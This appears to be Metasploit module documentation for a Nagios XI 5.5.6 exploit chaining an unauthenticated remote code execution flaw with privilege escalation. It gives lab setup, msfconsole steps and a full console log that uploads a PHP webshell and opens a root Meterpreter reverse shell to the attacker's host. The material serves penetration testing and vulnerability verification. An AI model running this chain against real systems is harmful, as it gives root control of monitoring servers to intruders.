## Vulnerable Application

This module exploits two vulnerabilities in Nagios XI <= 5.5.6:
CVE-2018-15708 which allows for unauthenticated remote code execution
and CVE-2018-15710 which allows for local privilege escalation.
When combined, these two vulnerabilities allow execution of arbitrary
commands as root.

The exploit works as follows:

- A local HTTPS server is setup. When it is reached, this server responds with a payload.
- By crafting a malicious request, we make the target host send a request to our HTTPS server.
  - The local HTTPS server must be reachable from the Nagios host.
  - The `RSRVHOST` and `RSRVPORT` options are used to specify the HTTPS server host and port.
- A PHP webshell and payload executable are uploaded via `magpie_debug.php`.
- A command is executed via the webshell. This command elevates privileges and runs the payload executable.

## Verification Steps

Download a vulnerable version of the Nagios XI virtual appliance:

* https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.4.10-64.ova
* https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.4.13-64.ova
* https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.5.0-64.ova
* https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.5.6-64.ova

Or download a [vulnerable application installer](https://www.nagios.com/downloads/nagios-xi/older-releases/) and follow the
[installation instructions](https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf).

Metasploit:

1. `msfconsole`
1. `use exploit/linux/http/nagios_xi_magpie_debug`
1. `set RHOSTS [IP]`
1. `set RSRVHOST [IP]`
1. `exploit`
1. You should get a new session with *root* privileges

## Options

### RSRVHOST

IP address at which the local HTTPS server can be reached.
Most of the time it will be a public IP (e.g. your router IP if you have port forwarding).

### RSRVPORT

Port at which the local HTTPS server can be reached.

## Scenarios

## NagiosXI 5.5.6 (x64) virtual appliance

```
msf6 > use exploit/linux/http/nagios_xi_magpie_debug
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_magpie_debug) > set rhosts 10.1.1.113
rhosts => 10.1.1.113
msf6 exploit(linux/http/nagios_xi_magpie_debug) > set rsrvhost 10.1.1.114
rsrvhost => 10.1.1.114
msf6 exploit(linux/http/nagios_xi_magpie_debug) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.1.1.114:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Found MagpieRSS.
[*] Using URL: https://0.0.0.0:8080/iRtxnl8L
[*] Local IP: https://10.1.1.114:8080/iRtxnl8L
[*] Server started.
[*] Uploading to /usr/local/nagvis/share/fbHGUhauqtV.php ...
[+] fbHGUhauqtV.php uploaded successfully!
[*] Using URL: https://0.0.0.0:8080/YvyES7YlFee8R
[*] Local IP: https://10.1.1.114:8080/YvyES7YlFee8R
[*] Server started.
[*] Uploading to /usr/local/nagvis/share/nYRTioXKBam ...
[+] nYRTioXKBam uploaded successfully!
[*] Checking PHP web shell: /nagvis/fbHGUhauqtV.php
[+] Success! Commands executed as user: uid=48(apache) gid=48(apache) groups=48(apache),1000(nagios),1001(nagcmd)
[*] Attempting privilege escalation ...
[*] Sending stage (3008420 bytes) to 10.1.1.113
[*] Meterpreter session 1 opened (10.1.1.114:4444 -> 10.1.1.113:42314) at 2021-03-16 02:58:20 -0400
[+] Deleted /usr/local/nagvis/share/fbHGUhauqtV.php
[+] Deleted /usr/local/nagvis/share/nYRTioXKBam
[!] This exploit may require manual cleanup of '/var/tmp/hRyNmrQHZAq.nse' on the target
[*] Server stopped.

msf6 exploit(linux/http/nagios_xi_magpie_debug) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : CentOS 7.5.1804 (Linux 3.10.0-862.14.4.el7.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
